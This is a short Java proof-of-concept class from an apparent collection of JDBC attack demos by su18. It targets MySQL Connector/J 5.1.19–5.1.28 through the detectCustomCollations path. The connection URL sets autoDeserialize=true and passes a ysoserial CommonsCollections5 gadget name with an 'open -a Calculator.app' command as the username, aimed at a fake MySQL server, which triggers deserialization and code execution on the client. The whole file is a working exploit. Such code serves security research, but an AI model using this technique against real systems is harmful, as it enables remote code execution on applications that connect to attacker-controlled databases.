package org.su18.jdbc.attack.mysql.customcollations;

import org.su18.jdbc.attack.mysql.util.ConnectionUtil;

/**
 * 使用 https://github.com/fnmsd/MySQL_Fake_Server 进行测试
 * 依赖版本 5.1.19
 * 驱动名称 com.mysql.jdbc.Driver
 * 属性名 detectCustomCollations
 * 连接参数 autoDeserialize=true
 * 备注 5.1.19-5.1.28 无需指定 detectCustomCollations
 *
 * @author su18
 */
public class Attack511x {

	public static void main(String[] args) throws Exception {

		String driverName    = "com.mysql.jdbc.Driver";
		String connectionUrl = "jdbc:mysql://localhost:13308/whatever?autoDeserialize=true";

		ConnectionUtil.getJDBCConnection(driverName, connectionUrl, "yso_CommonsCollections5_open -a Calculator.app", "");
	}

}
